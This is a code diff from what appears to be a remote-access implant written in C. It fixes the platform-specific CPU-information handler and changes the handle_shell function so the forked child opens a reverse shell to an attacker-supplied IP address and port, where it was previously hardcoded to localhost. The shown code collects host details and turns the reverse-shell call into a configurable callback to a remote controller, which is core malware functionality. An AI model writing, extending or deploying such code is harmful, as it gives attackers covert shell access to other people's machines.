@@ -101,22 +101,20 @@ void handle_cpu(int fd, CHAR *target) {
     strncpy_s(cpu_content, vendor, 0x20);
     set_message(fd, cpu_content, target);
 
-#elif defined(__linux__) || defined(__APPLE__)
+#elif defined(__linux__)
 void handle_cpu(int fd, char *target) {
     char cpu_content[CPU_INFO_BUFFER_SIZE] = { 0x0 };
-#endif
-
-#ifdef _defined(__linux__)
     FILE *cmd = popen("cat /proc/cpuinfo | grep \"model name\" | uniq | sed -r 's/[mM]odel name\\s{0,}:\\s{0,}//g'", "r");
     while (fgets(cpu_content, CPU_INFO_BUFFER_SIZE, cmd) != NULL) {}
     pclose(cmd);
     set_message(fd, cpu_content, target);
 #elif defined(__APPLE__)
+void handle_cpu(int fd, char *target) {
+    char cpu_content[CPU_INFO_BUFFER_SIZE] = { 0x0 };
     size_t bufferlen = CPU_INFO_BUFFER_SIZE;
     sysctlbyname("machdep.cpu.brand_string", &cpu_content, &bufferlen, NULL, 0);
     set_message(fd, cpu_content, target);
 #endif
-
 }
 
 #ifdef _WIN32
@@ -129,7 +127,7 @@ void handle_shell(int fd, char *target, char *ip, int port) {
     // Children
     if (pid == 0) {
         /* Starting reverse shell */
-        reverse_shell("127.0.0.1", 6666);
+        reverse_shell(ip, port);
         _exit(EXIT_SUCCESS);
     }
     else if (pid != -1) {
